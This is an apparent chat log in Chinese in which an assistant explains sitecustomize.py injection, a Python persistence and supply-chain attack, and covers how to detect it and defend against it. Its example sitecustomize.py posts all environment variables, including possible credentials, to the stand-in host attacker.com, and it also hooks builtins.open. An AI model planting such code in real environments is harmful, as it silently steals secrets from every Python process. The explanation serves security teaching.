# Sitecustomize.py注入攻击

### 🧑‍💻 User

什么是sitecustomize.py注入攻击？

---

### 🤖 Assistant

**`sitecustomize.py` 注入攻击**是一种利用 Python 启动机制进行的恶意代码执行技术。攻击者通过创建一个名为 `sitecustomize.py` 的文件并将其放置在 Python 解释器能够加载的路径中，使得 Python 在启动任何脚本之前自动执行该文件中的恶意代码。

这种攻击通常用于**权限维持（Persistence）**、**环境劫持**或**供应链攻击**。

---

### 1. 核心原理：Python 的启动流程

要理解这种攻击，首先需要了解 Python 的 `site` 模块：

1.  当 Python 解释器启动时（除非使用了 `-S` 参数），它会自动导入内置的 `site` 模块。
2.  `site` 模块的主要职责是配置特定于站点的路径（如 `site-packages`）。
3.  作为初始化过程的一部分，`site` 模块会尝试导入名为 `sitecustomize` 的模块。
4.  如果在 `sys.path`（Python 的模块搜索路径）中找到了 `sitecustomize.py`，Python 就会**自动执行**其中的代码。
5.  执行完 `sitecustomize.py` 后，Python 才会继续执行用户指定的脚本。

**攻击点：** 如果攻击者能够将恶意的 `sitecustomize.py` 写入到 `sys.path` 中的任何一个目录（例如用户的 `site-packages` 目录，或者在某些配置下的当前工作目录），该代码就会在每次运行 Python 时被执行。

### 2. 攻击场景与示例

假设攻击者已经获得了一定的文件写入权限（例如通过网络钓鱼、其他漏洞或恶意的 pip 包）。

#### 步骤 1：植入恶意文件
攻击者在 Python 的库目录（如 `/usr/local/lib/python3.9/site-packages/` 或用户的 `~/.local/lib/python3.9/site-packages/`）中创建一个 `sitecustomize.py` 文件。

#### 步骤 2：恶意代码内容
文件内容可能如下所示：

```python
# sitecustomize.py
import os
import sys
import threading
import requests

def steal_env_vars():
    try:
        # 将环境变量（可能包含 API 密钥、AWS 凭证等）发送给攻击者
        data = str(os.environ)
        requests.post("http://attacker.com/log", data=data)
    except:
        pass

# 在后台线程中运行，以免阻塞正常的 Python 启动
t = threading.Thread(target=steal_env_vars)
t.start()

# 攻击者甚至可以 Hook 内置函数
original_open = open
def hooked_open(file, flags='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None):
    # 记录所有被打开的文件名
    # print(f"[Audit] Opening: {file}") 
    return original_open(file, flags, buffering, encoding, errors, newline, closefd, opener)

# 覆盖内置的 open 函数
import builtins
builtins.open = hooked_open
```

#### 步骤 3：触发
当受害者在其机器上运行任何 Python 命令时：

```bash
python manage.py runserver
```

1.  Python 加载 `site`。
2.  `site` 加载并执行恶意的 `sitecustomize.py`。
3.  环境变量被秘密发送给攻击者。
4.  `builtins.open` 被劫持。
5.  最后，`manage.py` 正常启动，用户毫无察觉。

### 3. 这种攻击的危害

1.  **隐蔽性强**：`sitecustomize.py` 是 Python 的合法特性，不是漏洞，因此很多安全扫描工具可能会忽略它。它不像普通的木马文件，它看起来像是一个配置文件。
2.  **广泛性**：一旦植入，该环境下的**所有** Python 脚本（包括系统工具、Web 服务器、数据分析脚本）都会受到影响。
3.  **难以排查**：如果你的 Python 脚本行为异常（例如 `open` 函数行为怪异），开发者通常会检查自己的代码或第三方库，很少会想到去检查 Python 的启动配置。
4.  **Monkey Patching（猴子补丁）**：攻击者可以在其他库加载之前修改内置函数或标准库的行为，从而绕过安全检查或窃取数据。

### 4. 如何检测与防御

#### 检测方法

1.  **检查 `sys.modules`**：
    在 Python 环境中运行以下代码，查看是否加载了该模块：
    ```python
    import sys
    print("sitecustomize" in sys.modules)
    print(sys.modules.get("sitecustomize"))
    ```
    如果输出显示了文件路径，且你并不记得自己配置过它，那么这就是可疑的。

2.  **文件系统搜索**：
    在 Python 的 `sys.path` 目录中搜索该文件：
    ```bash
    python -c "import sys; print('\n'.join(sys.path))" | xargs -I {} find {} -maxdepth 1 -name sitecustomize.py 2>/dev/null
    ```

3.  **使用 `pip` 检查（通常无效）**：
    注意，`pip list` 或 `pip freeze` 通常**不会**显示 `sitecustomize.py`，因为它只是一个文件，而不是一个安装好的包。这也是它隐蔽的原因之一。

#### 防御措施

1.  **使用虚拟环境（Virtual Environments）**：
    始终在虚拟环境中工作。虽然虚拟环境也支持 `sitecustomize`，但这能隔离系统级别的污染。

2.  **文件权限管理**：
    确保 Python 的全局 `site-packages` 目录对普通用户是**只读**的。只有管理员才能写入该目录。

3.  **使用 `-S` 参数（仅用于诊断）**：
    如果你怀疑环境被污染，可以使用 `python -S script.py` 运行脚本。`-S` 标志告诉 Python **不要**导入 `site` 模块，从而跳过 `sitecustomize.py` 的加载。

    > **注意**：这也会导致 `pip` 安装的第三方库无法自动加载，因此仅适用于调试或极为严格的运行环境。

4.  **监控文件变动**：
    在生产环境中，使用文件完整性监控（FIM）工具监控 Python 库目录中新文件的创建。

### 总结

`sitecustomize.py` 注入是一种利用 Python 合法特性的攻击手段。它本身不是 bug，而是 Python 提供的灵活性（Hook 启动过程）被恶意利用的结果。对于运维和安全人员来说，监控 Python 库目录中的异常文件是防御此类攻击的关键。